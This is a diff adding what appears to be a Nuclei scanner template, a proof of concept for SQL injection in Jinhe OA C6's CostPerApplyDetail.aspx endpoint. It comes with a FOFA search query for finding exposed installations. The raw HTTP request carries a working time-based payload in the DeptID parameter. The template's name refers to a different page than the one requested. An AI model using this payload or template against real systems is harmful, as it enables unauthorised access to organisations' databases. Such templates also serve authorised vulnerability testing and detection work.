@@ -1,0 +1,21 @@
+id: poc-iy680yt9q96azyqa
+info:
+  name: 金和OAC6 CostPerExpendDetail存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iy680yt9q96azyqa'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iy680yt9q96azyqa
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1''waitfor+delay+''0:0:5''--+ HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
